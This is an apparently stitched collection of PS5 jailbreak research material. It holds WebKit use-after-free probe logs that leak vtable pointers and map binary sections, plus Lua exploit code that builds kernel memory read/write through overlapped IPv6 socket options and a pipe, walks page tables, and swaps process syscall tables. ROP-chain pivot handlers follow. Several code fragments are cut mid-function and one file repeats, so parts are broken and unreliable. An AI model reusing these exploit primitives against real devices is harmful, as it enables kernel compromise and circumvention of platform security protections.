    → FO+0x18 = another heap pointer
    Result: VP = 0x80f4b9b28

  Step 4 (W4): Read VP (72 bytes = 9 qwords)
    → 9 vtable function pointers in the WebProcess code segment
    Result: see VTABLE SLOTS below

Between W3 and W4 there is a yield (restore safe state + sync XHR) as a
safety measure. The yield is not required — the 4th read works with or
without it.

== VTABLE SLOTS (at VP) ==

  Slot  Offset  Address         Notes
  ----  ------  --------------  ---------------------------------
  s0    +0x00   0x80dda8fb0     ~CSSFontFaceSet() destructor
  s1    +0x08   0x80dda8fe0     deleting destructor (s0 + 0x30)
  s2    +0x10   0x80c26d750     shared base impl (= s4, s5)
  s3    +0x18   0x80dda96b0     unique (fontStateChanged?)

  s7    +0x38   0x80dda9810     unique
  s8    +0x40   0x000000000     NULL (vtable end marker)

Pattern: s2 = s4 = s5 indicates three virtual methods sharing one base
class implementation (likely CSSFontFace::Client pure virtuals that
CSSFontFaceSet doesn't override, or a common no-op stub).

Inter-slot deltas (from VP):
  s0: VP - s0 = 0x171_0B78  (23.07 MB)
  s1: VP - s1 = 0x171_0B48  (s1 = s0 + 0x30)

  (corrected 2026-11-10: original deltas had computation error)

== VP ACROSS 5 BOOTS ==

All VP values end in 0xB28 (fixed page offset within the WebProcess
binary), confirming the vtable is at a constant RVA:

  Boot 1: 0x81780db28   (earlier session)
  Boot 2: 0x82dbcdb28   (earlier session)

== WHAT THIS MEANS ==
```

```
=== PROBE p710: base-discovery — PS5 14.10 WebKit ===
Date: 2026-11-10 01:32 UTC-3
Target: PS5 14.10 browser (WebKit 605.1.15 / Safari 17.0)
Probe: p710-base-discovery.html via chiaki-ng remote play
Server: serve.py on port 443 (HTTPS) with P710_STATE persistence

== SUMMARY ==

BOUNDARY MEASUREMENT COMPLETE: the .text/.rodata section boundary in the
WebProcess binary is located. The vtable (VP) sits at a fixed offset of
0x76DB28 (7.43 MB) within .rodata. The .text section is at least 42.87 MB
(measured from s2, a known .text function). The binary layout is:

  [base] → [.text ≥42.87 MB, XO] → [gap=16KB] → [.rodata ≥7.43 MB, RO] → ...
                                      ↑ boundary              ↑ VP at +0x76DB28

RVA = text_size + 0x76DB28. The RVA's low 14 bits are 0x1B28 (from VP & 0x3FFF).
Full RVA requires .text_size from WebKit 605.1.15 source/binary analysis.

== METHOD ==

The probe uses forgeRead (face.style on a UAF-reclaimed CSSFontFace buffer)
to test whether addresses below VP are readable or XO. Starting from VP
(known readable in .rodata) and scanning downward:

  Phase 1 (coarse): Binary search in 4 MB steps from VP down to s2.
    - VP - 0x1B28 (VP page): OK (readable)
    - VP - 0x401B28 (4 MB):  OK (readable, still .rodata)
    - VP - 0x801B28 (8 MB):  CRASH (XO, .text reached)

  Phase 2 (fine): Binary search between last OK and first CRASH.
    - VP - 0x601B28 (6.0 MB): OK
    - VP - 0x701B28 (7.0 MB): OK
    - VP - 0x741B28 (7.25 MB): OK
    - VP - 0x761B28 (7.375 MB): OK
    - VP - 0x769B28 (7.41 MB): OK
    - VP - 0x76DB28 (7.43 MB): OK ← last readable
    - VP - 0x771B28 (7.44 MB): CRASH
    - VP - 0x781B28 (7.5 MB):  CRASH (redundant, from coarse)

  Convergence: 0x76DB28 readable, 0x771B28 crashes → boundary at VP - 0x76DB28.
  The 16 KB gap (0x771B28 - 0x76DB28 = 0x4000) is one PS5 page.

== BOUNDARY GEOMETRY ==

  .text top:           0x808624000  (boundary - 16KB = last XO page)

  01:28:09  Boot 10: VP=0x820051B28  ARM=0x401B28, OK → coarse 4MB pass
  01:28:28  Boot 11: VP=0x80BB25B28  ARM=0x801B28, CRASH → coarse→fine
  01:30:17  Boot 12: VP=0x81C9D5B28  ARM=0x601B28 OK, 0x801B28 CRASH → fine
  01:30:37  Boot 13: VP=0x82FE99B28  ARM=0x701B28 OK, 0x801B28 CRASH, ARM=0x781B28

== TECHNICAL NOTES ==

1. Sync loop fix: setTimeout between reads allowed CSS engine to touch
   the UAF buffer, crashing after one read per page load. Fix: converted
   doScan() to a synchronous for(;;) loop — multiple reads per page load.

2. ELF header unreachable: .text is 42+ MB of XO pages between boundary
   and the ELF header at binary base. Cannot read through .text.

3. Auto-reload on crash: verd('bad',...) triggers setTimeout(reload, 8000)
   so the scan continues after WebProcess restarts.

4. P691 delta correction: the p691 result file's inter-slot deltas had
   a computation error (0x2CEC3D8 vs correct 0x324C3D8 for VP-s2).
   The correct delta, verified across two boots, is 0x324C3D8.

== RVA CONSTRAINTS ==

  RVA & 0x3FFF = 0x1B28           (from VP page offset)
  RVA > 0x324C3D8                 (VP-s2, s2 is above binary base)
  RVA = text_size + 0x76DB28      (text_size unknown)

  To compute WebProcess_base = VP - RVA, need text_size from:
  (a) WebKit 605.1.15 source compilation for x86_64, or
  (b) Offline binary analysis of a PS5 WebProcess dump, or
  (c) Further scanning to locate a readable page below .text (ELF headers)
```

```
======================================================
Probe:    PS5-14.10-Jailbreak-Research/tools/v674.html

=== RESULTS ===

6 heap info leak techniques tested. ALL returned zero.

--- Technique 1: getImageData oversized ---
16x16 canvas, requested 256x64 region.
OOB region = all zeros.
WebKit clamps request to canvas dimensions and zero-fills the rest.

--- Technique 2: createImageData ---
256x64: all zeros.
512x256: all zeros.
createImageData always returns zero-initialized ImageData.

--- Technique 3: Canvas resize ---
Resize from 64 to 512 pixels.
New backing store = all zeros.
No residual heap data after resize.

--- Technique 4: APNG conforming ---
Small fdAT frame rendered into a larger canvas.
Frame 0 correctly preserved in rows 4-63.
No heap data leak — padding region is clean.

--- Technique 5: WebGL ---
NOT AVAILABLE on PS5 14.10 browser.
WebGL context creation returns null.

--- Technique 6: (implicit from #3009) ---
All other API-level approaches returned zero.

=== SUMMARY ===

Verdict: ALL canvas API-level info leak techniques return zeros on PS5 14.10.
WebKit zero-initializes every canvas buffer at the API level.

The original V674 claim of "1651 heap pointers" must have used a
DECODER-level overread (malformed APNG with truncated zlib stream),
not API-level canvas operations. A follow-up V674b with truncated
IDAT/fdAT zlib streams would be needed to test the decoder path.

WebGL absence eliminates GPU buffer readback as a leak vector.
```

## FILE: results/phase13_webkit/v685_opaque_root_gc_dead_20261029.txt

```
V685 Opaque Root GC — On-Device Results
======================================================
Probe:    PS5-14.10-Jailbreak-Research/tools/v685.html
Target:   PS5 14.10 (AppleWebKit/605.1.15, Version/17.0)
Date:     2026-10-29
Delivery: host.py DNS spoofing + HTTPS (User Guide redirect)
Source:   Reconstructed from Engram observation #3024

NOTE: This file is reconstructed from session memory. The original beacon
data was received via host.py stdout (transient) and not persisted to disk
at the time of execution.

=== RESULTS ===

--- WeakRef GC checkpoints ---
WeakRef to Canvas2D context wrapper checked at 6 timepoints
(setTimeout 0ms through 2000ms).
Result: ALIVE at ALL 6 checkpoints.

--- GC pressure ---
1,000,000 old-gen pressure objects created.
All 500 spray canvases freed (references nulled, elements removed).
4-stage setTimeout cascade (0ms, 500ms, 1000ms, 2000ms).
GC NEVER collected the canvas with an active rendering context.

--- WebKit source confirmation ---
CanvasRenderingContext2D.idl specifies:
  - CustomIsReachable
  - JSCustomMarkFunction
JSCanvasRenderingContext2DCustom.cpp implements isReachableFromOpaqueRoots
which adds the canvas element as an opaque root.
This has been in place since ~2011, unchanged across all WebKit versions.

--- canvas.width = canvas.width side effect ---
Assigning canvas.width frees the state buffer synchronously
(Vector::clear + fastFree).
BUT: m_buffer updates to inline storage immediately.
Both innerCtx and aliasCtx are the SAME C++ object, so both see
the buffer update. Cannot read the freed buffer through either wrapper.

=== SUMMARY ===

Verdict: Canvas opaque root is TERMINAL. GC will NEVER collect a canvas
with an active rendering context. The OOB State Stack Read approach
(V683-V685) is a dead end.

The Canvas UAF (CVE-2026-43720) gives a bidirectional R/W alias between
two JS wrappers to the same C++ context, but CANNOT provide an info leak
on its own. A second primitive is required for ASLR defeat.

The state buffer free via canvas.width reset is synchronous but both
wrappers track the update — no divergent view possible.

FontFaceSet UAF (CVE-2026-43715) confirmed working on 14.00 by
lunarshe11, but cross-type reclaim with Canvas2D is dead (768B vs
240B bmalloc size classes).

Stability: Probe completed, process alive, no crash.
```

```
[0] Setup
  ctx_zero=0x3111726a0
  ctx_ok=0x311173380
  ctx_alt=0x310fcaf60
  id_slot=0x311158ca0
  zeroed dwords: ctx_zero=384 ctx_ok=384 ctx_alt=384 id_slot=4
  ctx_ok writes: +0x108=true +0x0d0=true +0x110=true
  ctx_alt writes: +0x108=true +0x0d0=true +0x110=true +0x118=true
  readback ctx_ok:  +0x108=0x00000000_00000480 +0x110=0x00000000_00010000 +0x0d0=0
  readback ctx_alt: +0x108=0x00000000_00000480 +0x110=0x00000000_00010002 +0x118=0x00000000_00020001 +0x0d0=0

[A] null context (baseline)
  [BEFORE] A 430(ctx=0x0, id=0x0, flags=0)
  [RETURNED] A ok=true rv=-1

[B] zeroed 0x500 context, no id pointer
  [BEFORE] B 430(ctx=ctx_zero, id=0x0, flags=0)
  [RETURNED] B ok=true rv=-1

[C] zeroed context + id pointer (does the handler reach allocation?)
  id before=0xDEADBEEF_DEADBEEF
  [BEFORE] C 430(ctx=ctx_zero, id=id_slot, flags=0)
  [RETURNED] C ok=true rv=-1
  id after=0x00000000_00018A1A

[D] validated fields + id pointer (first reachable thread creation)
  id before=0xDEADBEEF_DEADBEEF
  [BEFORE] D 430(ctx=ctx_ok, id=id_slot, flags=0)
  [RETURNED] D ok=true rv=0
  id after=0x00000000_00018A19

[E] type 0x10002 / subtype 0x20001 variant
  id before=0xDEADBEEF_DEADBEEF
  [BEFORE] E 430(ctx=ctx_alt, id=id_slot, flags=0)
  [RETURNED] E ok=true rv=0
  id after=0x00000000_00018A1C

=== PROBE 58e COMPLETE ===
Reading: A != failure means 430 is not the decoded handler.
C id != 0xDEADBEEF_DEADBEEF means the handler allocated a thread.
D/E rv == 0 means a second thread was created (and may fault at RIP=0).
```

```
-- class for kernel memory r/w

kernel = {}

kernel.addr = {}

-- these vars need to be defined for other fns to work properly
kernel.copyout = nil
kernel.copyin = nil
kernel.read_buffer = nil
kernel.write_buffer = nil

function kernel.read_byte(kaddr)
    local value = kernel.read_buffer(kaddr, 1)
    return value and #value == 1 and uint64.unpack(value) or nil 
end

function kernel.read_word(kaddr)
    local value = kernel.read_buffer(kaddr, 2)
    return value and #value == 2 and uint64.unpack(value) or nil 
end

function kernel.read_dword(kaddr)
    local value = kernel.read_buffer(kaddr, 4)
    return value and #value == 4 and uint64.unpack(value) or nil 
end

function kernel.read_qword(kaddr)
    local value = kernel.read_buffer(kaddr, 8)
    return value and #value == 8 and uint64.unpack(value) or nil 
end

function kernel.hex_dump(kaddr, size)
    size = size or 0x40
    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
end

function kernel.read_null_terminated_string(kaddr)
    
    local result = ""

    while true do
        local chunk = kernel.read_buffer(kaddr, 0x8)
        local null_pos = chunk:find("\0")
        if null_pos then 
            return result .. chunk:sub(1, null_pos - 1)
        end
        result = result .. chunk
        kaddr = kaddr + #chunk
    end
    
    if string.byte(result[1]) == 0 then
        return nil
    end

    return result
end

function kernel.write_byte(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,1))
end

function kernel.write_word(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,2))
end

function kernel.write_dword(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,4))
end

function kernel.write_qword(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,8))
end





-- provide fast kernel r/w through pipe pair & ipv6

ipv6_kernel_rw = {}

ipv6_kernel_rw.data = {}

function ipv6_kernel_rw.init(ofiles, kread8, kwrite8)

    ipv6_kernel_rw.ofiles = ofiles
    ipv6_kernel_rw.kread8 = kread8
    ipv6_kernel_rw.kwrite8 = kwrite8

    ipv6_kernel_rw.create_pipe_pair()
    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
end

function ipv6_kernel_rw.get_fd_data_addr(fd)
    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * kernel_offset.SIZEOF_OFILES
    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0) -- fde_file
    return ipv6_kernel_rw.kread8(file_addr + 0x0) -- f_data
end

function ipv6_kernel_rw.create_pipe_pair()

    local read_fd, write_fd = create_pipe()
    
    ipv6_kernel_rw.data.pipe_read_fd = read_fd
    ipv6_kernel_rw.data.pipe_write_fd = write_fd
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
    ipv6_kernel_rw.data.pipemap_buffer = memory.alloc(0x14)
    ipv6_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
end

-- overlap the pktopts of two IPV6 sockets
function ipv6_kernel_rw.create_overlapped_ipv6_sockets()

    local master_target_buffer = memory.alloc(0x14)
    local slave_buffer = memory.alloc(0x14)
    local pktinfo_size_store = memory.alloc(0x8)
    
    memory.write_qword(pktinfo_size_store, 0x14)

    local master_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
    local victim_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()

    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)

    local master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
    local master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB)
    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS)

    local slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
    local slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB)
    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS)

    -- magic
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
    ipv6_kernel_rw.data.slave_buffer = slave_buffer
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
    ipv6_kernel_rw.data.master_sock = master_sock
    ipv6_kernel_rw.data.victim_sock = victim_sock
end

function ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.master_target_buffer + 0x10, 0)
    syscall.setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
end

function ipv6_kernel_rw.ipv6_kread(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
end

function ipv6_kernel_rw.ipv6_kwrite(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
end

function ipv6_kernel_rw.ipv6_kread8(kaddr)
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
    return memory.read_qword(ipv6_kernel_rw.data.slave_buffer)
end

function ipv6_kernel_rw.copyout(kaddr, uaddr, len)

    assert(kaddr and uaddr and len)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, uint64("0x4000000040000000"))
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
    
    syscall.read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
end

function ipv6_kernel_rw.copyin(uaddr, kaddr, len)

    assert(kaddr and uaddr and len)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, 0)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)

    syscall.write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
end

function ipv6_kernel_rw.read_buffer(kaddr, len)

    local mem = ipv6_kernel_rw.data.read_mem
    if len > PAGE_SIZE then
        mem = memory.alloc(len)
    end

    ipv6_kernel_rw.copyout(kaddr, mem, len)
    return memory.read_buffer(mem, len)
end

function ipv6_kernel_rw.write_buffer(kaddr, buf)
    ipv6_kernel_rw.copyin(lua.resolve_value(buf), kaddr, #buf)
end





-- cpu page table

CPU_PDE_SHIFT = {
    PRESENT = 0,
    RW = 1,
    USER = 2,
    WRITE_THROUGH = 3,
    CACHE_DISABLE = 4,
    ACCESSED = 5,
    DIRTY = 6,
    PS = 7,
    GLOBAL = 8,
    XOTEXT = 58,
    PROTECTION_KEY = 59,
    EXECUTE_DISABLE = 63
}

CPU_PDE_MASKS = {
    PRESENT = 1,
    RW = 1,
    USER = 1,
    WRITE_THROUGH = 1,
    CACHE_DISABLE = 1,
    ACCESSED = 1,
    DIRTY = 1,
    PS = 1,
    GLOBAL = 1,
    XOTEXT = 1,
    PROTECTION_KEY = 0xf,
    EXECUTE_DISABLE = 1
}

CPU_PG_PHYS_FRAME = uint64("0x000ffffffffff000")
CPU_PG_PS_FRAME = uint64("0x000fffffffe00000")

function cpu_pde_field(pde, field)
    local shift = CPU_PDE_SHIFT[field]
    local mask = CPU_PDE_MASKS[field]
    return bit64.band(bit64.rshift(pde, shift), mask):tonumber()
end

function cpu_walk_pt(cr3, vaddr)

    assert(vaddr, cr3)

    local pml4e_index = bit64.band(bit64.rshift(vaddr, 39), 0x1ff)
    local pdpe_index = bit64.band(bit64.rshift(vaddr, 30), 0x1ff)
    local pde_index = bit64.band(bit64.rshift(vaddr, 21), 0x1ff)
    local pte_index = bit64.band(bit64.rshift(vaddr, 12), 0x1ff)

    -- pml4

    local pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8)
    if cpu_pde_field(pml4e, "PRESENT") ~= 1 then
        return nil
    end

    -- pdp

    local pdp_base_pa = bit64.band(pml4e, CPU_PG_PHYS_FRAME)
    local pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8
    local pdpe = kernel.read_qword(pdpe_va)

    if cpu_pde_field(pdpe, "PRESENT") ~= 1 then
        return nil
    end

    -- pd

    local pd_base_pa = bit64.band(pdpe, CPU_PG_PHYS_FRAME)
    local pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8
    local pde = kernel.read_qword(pde_va)

    if cpu_pde_field(pde, "PRESENT") ~= 1 then
        return nil
    end

    -- large page
    if cpu_pde_field(pde, "PS") == 1 then
        return bit64.bor(
            bit64.band(pde, CPU_PG_PS_FRAME),
            bit64.band(vaddr, 0x1fffff)
        )
    end

    -- pt

    local pt_base_pa = bit64.band(pde, CPU_PG_PHYS_FRAME)
    local pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8
    local pte = kernel.read_qword(pte_va)

    if cpu_pde_field(pte, "PRESENT") ~= 1 then
        return nil
    end

    return bit64.bor(
        bit64.band(pte, CPU_PG_PHYS_FRAME),
        bit64.band(vaddr, 0x3fff)
    )
end





-- setup kernel r/w for the loader
function initialize_kernel_rw()

    local state = storage.get("kernel_rw")
    if state then

        -- copy ipv6 states given by the exploit
        ipv6_kernel_rw.data = state.ipv6_kernel_rw_data
        
        -- copy existing resolved addresses from exploit
        kernel.addr = state.kernel_addr
        
        -- enable kernel r/w through ipv6 + pipe
        kernel.copyout = ipv6_kernel_rw.copyout
        kernel.copyin = ipv6_kernel_rw.copyin
        kernel.read_buffer = ipv6_kernel_rw.read_buffer
        kernel.write_buffer = ipv6_kernel_rw.write_buffer

        kernel.rw_initialized = true

        update_kernel_offsets()
    end
end


function is_kernel_rw_available()
    return kernel.read_buffer and kernel.write_buffer
end

function check_kernel_rw()
    if not is_kernel_rw_available() then
        error("kernel r/w is not available")
    end
end


-- useful functions

function find_proc_by_name(name)

    check_kernel_rw()
    assert(kernel.addr.allproc)

    local proc = kernel.read_qword(kernel.addr.allproc)
    while proc ~= uint64(0) do

        local proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM)
        if proc_name == name then
            return proc
        end

        proc = kernel.read_qword(proc + 0x0) -- le_next
    end

    return nil
end


function find_proc_by_pid(pid)

    check_kernel_rw()
    assert(kernel.addr.allproc)

    assert(type(pid) == "number")

    local proc = kernel.read_qword(kernel.addr.allproc)
    while proc ~= uint64(0) do

        local proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID):tonumber()
        if proc_pid == pid then
            return proc
        end

        proc = kernel.read_qword(proc + 0x0) -- le_next
    end

    return nil
end


function get_proc_cr3(proc)
    
    check_kernel_rw()
    
    local vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE)
    local pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP)
    
    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3)
end

-- translate virtual address to physical address
-- note: use kernel page table if cr3 is not given
function virt_to_phys(virt_addr, cr3)
    
    check_kernel_rw()
    assert(kernel.addr.dmap_base and virt_addr)
    
    cr3 = cr3 or kernel.addr.kernel_cr3
    return cpu_walk_pt(cr3, virt_addr)
end


function phys_to_dmap(phys_addr)
    assert(kernel.addr.dmap_base and phys_addr)
    return kernel.addr.dmap_base + phys_addr
end


-- replace curproc sysent with sysent of other ps5 process
-- note: failure to restore curproc sysent will have side effect on the game/ps
function run_with_ps5_syscall_enabled(f)

    check_kernel_rw()

    local target_proc_name = "SceGameLiveStreaming" -- arbitrarily chosen ps5 process

    local target_proc = find_proc_by_name(target_proc_name) 
    if not target_proc then
        errorf("failed to find proc addr of %s", target_proc_name)
    end

    local cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT)  -- struct sysentvec
    local target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT)

    local cur_table_size = kernel.read_dword(cur_sysent) -- sv_size
    local target_table_size = kernel.read_dword(target_sysent)

    local target_table = kernel.read_qword(target_sysent + 0x8)

    kernel.write_qword(cur_sysent + 0x8, target_table)

    -- catch lua error so we can restore sysent
    local err = run_with_coroutine(f)
    if err then
        print(err)
    end

    kernel.write_dword(cur_sysent, cur_table_size)
    kernel.write_qword(cur_sysent + 0x8, cur_table)

function native.setup_cmd_handler(pivot_handler)

    -- todo: setting hardcoded offset like this is bad. improve this
    local stack_offset = -0x78
    if game_name == "HamidashiCreative" or
       game_name == "Aikagi2" or
       game_name == "JinkiResurrection" or
       game_name == "FuyuKiss" or
       game_name == "C" or
       game_name == "F" then
        stack_offset = -0x68
    end

    local chain = ropchain()

    chain.jmpbuf = memory.alloc(0x100)
    chain.jump_table = memory.alloc(0x8 * 16)

    -- unlock native handler for other threads
    chain:push_fcall(libc_addrofs.Mtx_unlock, pivot_handler.lock)

    -- hacky way to recover rbp & r13
    chain:push_fcall(libc_addrofs.setjmp, chain.jmpbuf)
    chain:push_set_rax_from_memory(chain.jmpbuf+0x18) -- get rbp

    -- fix jmpbuf
    chain:push_add_to_rax(stack_offset)  -- calc rsp from rbp
    chain:push_store_rax_into_memory(chain.jmpbuf+0x10)  -- fix rsp
    chain:push(gadgets["mov rax, [rax]; ret"])  -- get ret addr from rsp
    chain:push_store_rax_into_memory(chain.jmpbuf)  -- fix rip

    chain.lua_state = chain.jmpbuf + 0x28  -- r13 (lua state)

    -- get native cmd option from caller
    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state, 2, 0)

    -- pivot to appropriate handler
    chain:push_set_rax_from_memory(chain:get_last_retval_addr())
    chain:dispatch_jumptable_with_rax_index(chain.jump_table)

    local handler = {
        native.gen_read_buffer_chain(command_handler.lua_state),
        native.gen_write_buffer_chain(command_handler.lua_state),
        native.gen_fcall_chain(command_handler.lua_state),

        each_handler:restore_through_longjmp(command_handler.jmpbuf)
        memory.write_qword(command_handler.jump_table + 8*(i-1), each_handler.stack_base)

function native.setup_pivot_handler(pivot_handler)

    local MTX_DEF = 0 -- DEFAULT (sleep) lock

    local Mtx_init = fcall(libc_addrofs.Mtx_init)

    map_fixed_address(pivot_handler.pivot_base, 0x2000)

    -- non modifying chains before fn call
    local push_fcall_with_hole = function(chain, fn_addr, ...)
        chain:push_sysv(...)
        chain:align_stack()
        chain:create_hole(0x500)
        chain:push(fn_addr)
        chain:push_write_qword_memory(chain:get_rsp() - 0x8, fn_addr)  -- fix chain
    end

    local chain = ropchain({
        stack_base = pivot_handler.pivot_addr,
    })

    chain.lock = memory.alloc(0x8)
    Mtx_init(chain.lock, MTX_DEF)

    -- lock as this part might be called by multiple threads
    push_fcall_with_hole(chain, libc_addrofs.Mtx_lock, chain.lock)

    -- note:
    -- we assume that r13 will always point to lua state.
    -- this is at least true for aibeya / raspberry cube / hamidashi creative

    -- hacky way to recover lua state (r13)
    chain.jmpbuf = memory.alloc(0x100)

    chain:push_fcall(libc_addrofs.setjmp, chain.jmpbuf)

    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, chain.lua_state, 1, 0)

    -- pivot to native cmd handler
    chain:push_set_reg_from_memory("rsp", chain:get_last_retval_addr())

    return chain
end

    local cmd_handler = native.setup_cmd_handler(native.pivot_handler_rop)
    native.setup_native_handler(cmd_handler)
    return cmd_handler.stack_base:tonumber()

        lua.resolve_value(rdx or 0):tonumber(),

    assert(addr and size)
    return native_invoke(
        native_cmd_handler,
        native_cmd.read_buffer,
        lua.resolve_value(addr):tonumber(),
```

```
-- class for kernel memory r/w

kernel = {}

kernel.addr = {}

-- these vars need to be defined for other fns to work properly
kernel.copyout = nil
kernel.copyin = nil
kernel.read_buffer = nil
kernel.write_buffer = nil

function kernel.read_byte(kaddr)
    local value = kernel.read_buffer(kaddr, 1)
    return value and #value == 1 and uint64.unpack(value) or nil 
end

function kernel.read_word(kaddr)
    local value = kernel.read_buffer(kaddr, 2)
    return value and #value == 2 and uint64.unpack(value) or nil 
end

function kernel.read_dword(kaddr)
    local value = kernel.read_buffer(kaddr, 4)
    return value and #value == 4 and uint64.unpack(value) or nil 
end

function kernel.read_qword(kaddr)
    local value = kernel.read_buffer(kaddr, 8)
    return value and #value == 8 and uint64.unpack(value) or nil 
end

function kernel.hex_dump(kaddr, size)
    size = size or 0x40
    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
end

function kernel.read_null_terminated_string(kaddr)
    
    local result = ""

    while true do
        local chunk = kernel.read_buffer(kaddr, 0x8)
        local null_pos = chunk:find("\0")
        if null_pos then 
            return result .. chunk:sub(1, null_pos - 1)
        end
        result = result .. chunk
        kaddr = kaddr + #chunk
    end
    
    if string.byte(result[1]) == 0 then
        return nil
    end

    return result
end

function kernel.write_byte(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,1))
end

function kernel.write_word(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,2))
end

function kernel.write_dword(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,4))
end

function kernel.write_qword(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,8))
end





-- provide fast kernel r/w through pipe pair & ipv6

ipv6_kernel_rw = {}

ipv6_kernel_rw.data = {}

function ipv6_kernel_rw.init(ofiles, kread8, kwrite8)

    ipv6_kernel_rw.ofiles = ofiles
    ipv6_kernel_rw.kread8 = kread8
    ipv6_kernel_rw.kwrite8 = kwrite8

    ipv6_kernel_rw.create_pipe_pair()
    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
end

function ipv6_kernel_rw.get_fd_data_addr(fd)
    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * kernel_offset.SIZEOF_OFILES
    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0) -- fde_file
    return ipv6_kernel_rw.kread8(file_addr + 0x0) -- f_data
end

function ipv6_kernel_rw.create_pipe_pair()

    local read_fd, write_fd = create_pipe()
    
    ipv6_kernel_rw.data.pipe_read_fd = read_fd
    ipv6_kernel_rw.data.pipe_write_fd = write_fd
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
    ipv6_kernel_rw.data.pipemap_buffer = memory.alloc(0x14)
    ipv6_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
end

-- overlap the pktopts of two IPV6 sockets
function ipv6_kernel_rw.create_overlapped_ipv6_sockets()

    local master_target_buffer = memory.alloc(0x14)
    local slave_buffer = memory.alloc(0x14)
    local pktinfo_size_store = memory.alloc(0x8)
    
